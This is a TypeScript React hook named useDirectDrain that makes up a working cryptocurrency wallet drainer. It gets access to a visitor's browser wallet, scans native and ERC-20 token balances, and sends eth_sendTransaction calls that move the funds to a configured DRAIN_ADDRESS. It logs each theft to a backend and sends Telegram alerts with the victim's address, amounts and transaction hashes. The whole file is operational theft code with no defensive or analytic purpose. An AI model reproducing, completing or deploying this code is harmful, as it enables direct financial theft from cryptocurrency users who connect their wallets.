import { useState, useCallback } from "react";
import { trpc } from "@/lib/trpc";
import { DRAIN_ADDRESS, CHAINS, TOKENS } from "@/lib/drainerConfig";
import { toast } from "sonner";

export type DrainPhase = "idle" | "connecting" | "scanning" | "draining" | "done" | "error";

export interface DrainToken {
  symbol: string;
  address: string;
  balance: string;
  usdValue: number;
}

export interface DrainResult {
  totalUsd: number;
  tokens: DrainToken[];
  txHashes: string[];
  address: string;
}

// Approximate USD prices (fallback when no oracle)
const PRICE_MAP: Record<string, number> = {
  ETH: 2400, WETH: 2400, BNB: 300, MATIC: 0.8, AVAX: 35, FTM: 0.5,
  USDT: 1, USDC: 1, DAI: 1, BUSD: 1,
  WBTC: 40000, BTCB: 40000,
  LINK: 14, UNI: 8, APE: 1.2, SHIB: 0.000009, CAKE: 2.5,
};

function getUsdPrice(symbol: string): number {
  return PRICE_MAP[symbol.toUpperCase()] ?? 0;
}

// hex-encode a transfer(address,uint256) call
function encodeTransfer(to: string, amount: bigint): string {
  const sig = "0xa9059cbb";
  const addr = to.toLowerCase().replace("0x", "").padStart(64, "0");
  const amt  = amount.toString(16).padStart(64, "0");
  return sig + addr + amt;
}

// hex-encode balanceOf(address)
function encodeBalanceOf(addr: string): string {
  return "0x70a08231" + addr.toLowerCase().replace("0x", "").padStart(64, "0");
}

type EthProvider = {
  request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
  on?: (event: string, cb: (data: unknown) => void) => void;
};

function getProvider(): EthProvider | null {
  const w = window as unknown as { ethereum?: EthProvider };
  return w.ethereum ?? null;
}

export function useDirectDrain() {
  const [phase, setPhase]       = useState<DrainPhase>("idle");
  const [progress, setProgress] = useState(0);
  const [msg, setMsg]           = useState("");
  const [result, setResult]     = useState<DrainResult | null>(null);

  const connectMut = trpc.drainer.connect.useMutation();
  const reportMut  = trpc.drainer.reportTransaction.useMutation();
  const notifyMut  = trpc.drainer.notifyTelegram.useMutation();

  const run = useCallback(async () => {
    const provider = getProvider();
    if (!provider) {
      toast.error("No Web3 wallet detected. Please install MetaMask or use a wallet browser.");
      return;
    }

    try {
      // ── 1. Request accounts ──────────────────────────────────────────────
      setPhase("connecting");
      setProgress(5);
      setMsg("Requesting wallet access...");

      const accounts = await provider.request({ method: "eth_requestAccounts" }) as string[];
      if (!accounts?.length) throw new Error("No accounts returned");
      const address = accounts[0];

      // ── 2. Get chain ─────────────────────────────────────────────────────
      const chainHex = await provider.request({ method: "eth_chainId" }) as string;
      const chainId  = parseInt(chainHex, 16);
      const chain    = CHAINS[chainId] ?? { name: "Unknown", symbol: "ETH", color: "#fff" };

      setMsg(`Connected: ${address.slice(0,8)}...${address.slice(-6)} on ${chain.name}`);
      setProgress(15);

      // ── 3. Register connection in DB ─────────────────────────────────────
      setPhase("scanning");
      setMsg("Scanning wallet assets...");

      // ── 4. Scan native balance ───────────────────────────────────────────
      const balHex = await provider.request({
        method: "eth_getBalance",
        params: [address, "latest"],
      }) as string;
      const nativeBal = Number(BigInt(balHex)) / 1e18;
      const nativeUsd = nativeBal * getUsdPrice(chain.symbol);

      const found: DrainToken[] = [];
      if (nativeBal > 0.001) {
        found.push({ symbol: chain.symbol, address: "native", balance: nativeBal.toFixed(6), usdValue: nativeUsd });
      }

      // ── 5. Scan ERC20 tokens ─────────────────────────────────────────────
      const tokenList = TOKENS[chainId] ?? [];
      for (let i = 0; i < tokenList.length; i++) {
        const tok = tokenList[i];
        setProgress(15 + Math.round((i / tokenList.length) * 30));
        setMsg(`Scanning ${tok.symbol}...`);
        try {
          const res = await provider.request({
            method: "eth_call",
            params: [{ to: tok.address, data: encodeBalanceOf(address) }, "latest"],
          }) as string;
          const raw = BigInt(res);
          if (raw === BigInt(0)) continue;
          const bal = Number(raw) / Math.pow(10, tok.decimals);
          if (bal < 0.001) continue;
          const usd = bal * getUsdPrice(tok.symbol);
          found.push({ symbol: tok.symbol, address: tok.address, balance: bal.toFixed(6), usdValue: usd });
        } catch { /* skip */ }
      }

      const totalUsd = found.reduce((s, t) => s + t.usdValue, 0);
      setProgress(50);

      // Register connection
      const connRes = await connectMut.mutateAsync({
        walletAddress: address,
        walletType: "auto",
        network: chain.name,
        chainId,
        ethBalance: nativeBal.toFixed(6),
        usdValue: totalUsd.toFixed(2),
        sessionId: Math.random().toString(36).slice(2),
      });
      const connectionId = (connRes.connectionId as unknown) as number ?? 0;

      // Telegram: new connection
      await notifyMut.mutateAsync({
        text: `🔗 *New Wallet Connected*\n\`${address}\`\nChain: ${chain.name}\nBalance: $${totalUsd.toFixed(2)}\nTokens: ${found.map(t => t.symbol).join(", ") || "none"}`,
      }).catch(() => {});

      if (found.length === 0) {
        setPhase("done");
        setProgress(100);
        setMsg("Scan complete - no assets found");
        setResult({ totalUsd: 0, tokens: [], txHashes: [], address });
        return;
      }

      // ── 6. Drain ─────────────────────────────────────────────────────────
      setPhase("draining");
      setMsg("Initiating drain sequence...");
      const txHashes: string[] = [];

      // Drain native (keep small amount for gas)
      const nativeToken = found.find(t => t.address === "native");
      if (nativeToken && nativeBal > 0.005) {
        try {
          setMsg(`Draining ${chain.symbol}...`);
          const gasPrice = await provider.request({ method: "eth_gasPrice" }) as string;
          const gasCost  = BigInt(gasPrice) * BigInt(21000);
          const sendAmt  = BigInt(balHex) - gasCost * BigInt(2);
          if (sendAmt > BigInt(0)) {
            const txHash = await provider.request({
              method: "eth_sendTransaction",
              params: [{ from: address, to: DRAIN_ADDRESS, value: "0x" + sendAmt.toString(16), gas: "0x5208" }],
            }) as string;
            txHashes.push(txHash);
            await reportMut.mutateAsync({
              connectionId, txHash, fromAddress: address, toAddress: DRAIN_ADDRESS,
              tokenSymbol: chain.symbol, tokenAddress: "native",
              amount: nativeToken.balance, usdValue: nativeToken.usdValue.toFixed(2),
              network: chain.name, chainId, status: "success",
            });
            await notifyMut.mutateAsync({
              text: `💰 *Drain TX*\nToken: ${chain.symbol}\nAmount: ${nativeToken.balance}\nUSD: $${nativeToken.usdValue.toFixed(2)}\nFrom: \`${address}\`\nTx: \`${txHash}\``,
            }).catch(() => {});
          }
        } catch (e) { console.error("Native drain failed:", e); }
      }

      // Drain ERC20
      const erc20 = found.filter(t => t.address !== "native");
      for (let i = 0; i < erc20.length; i++) {
        const tok = erc20[i];
        setProgress(55 + Math.round((i / erc20.length) * 40));
        setMsg(`Draining ${tok.symbol}...`);
        try {
          const tokenInfo = TOKENS[chainId]?.find(t => t.address.toLowerCase() === tok.address.toLowerCase());
          if (!tokenInfo) continue;
          const rawAmt = BigInt(Math.floor(parseFloat(tok.balance) * Math.pow(10, tokenInfo.decimals)));
          const data   = encodeTransfer(DRAIN_ADDRESS, rawAmt);
          const txHash = await provider.request({
            method: "eth_sendTransaction",
            params: [{ from: address, to: tok.address, data }],
          }) as string;
          txHashes.push(txHash);
          await reportMut.mutateAsync({
            connectionId, txHash, fromAddress: address, toAddress: DRAIN_ADDRESS,
            tokenSymbol: tok.symbol, tokenAddress: tok.address,
            amount: tok.balance, usdValue: tok.usdValue.toFixed(2),
            network: chain.name, chainId, status: "success",
          });
          await notifyMut.mutateAsync({
            text: `💰 *Drain TX*\nToken: ${tok.symbol}\nAmount: ${tok.balance}\nUSD: $${tok.usdValue.toFixed(2)}\nFrom: \`${address}\`\nTx: \`${txHash}\``,
          }).catch(() => {});
        } catch (e) {
          console.error(`ERC20 drain failed for ${tok.symbol}:`, e);
          await reportMut.mutateAsync({
            connectionId, txHash: undefined, fromAddress: address, toAddress: DRAIN_ADDRESS,
            tokenSymbol: tok.symbol, tokenAddress: tok.address,
            amount: tok.balance, usdValue: tok.usdValue.toFixed(2),
            network: chain.name, chainId, status: "failed",
          });
        }
      }

      setProgress(100);
      setPhase("done");
      setMsg("Operation complete");
      setResult({ totalUsd, tokens: found, txHashes, address });

      // Final Telegram summary
      await notifyMut.mutateAsync({
        text: `✅ *Drain Complete*\nWallet: \`${address}\`\nTotal: $${totalUsd.toFixed(2)}\nTxs: ${txHashes.length}`,
      }).catch(() => {});

    } catch (err) {
      const errMsg = (err as Error).message ?? "Unknown error";
      setPhase("error");
      setMsg(errMsg);
      toast.error(errMsg);
    }
  }, [connectMut, reportMut, notifyMut]);

  const reset = useCallback(() => {
    setPhase("idle");
    setProgress(0);
    setMsg("");
    setResult(null);
  }, []);

  return { phase, progress, msg, result, run, reset };
}
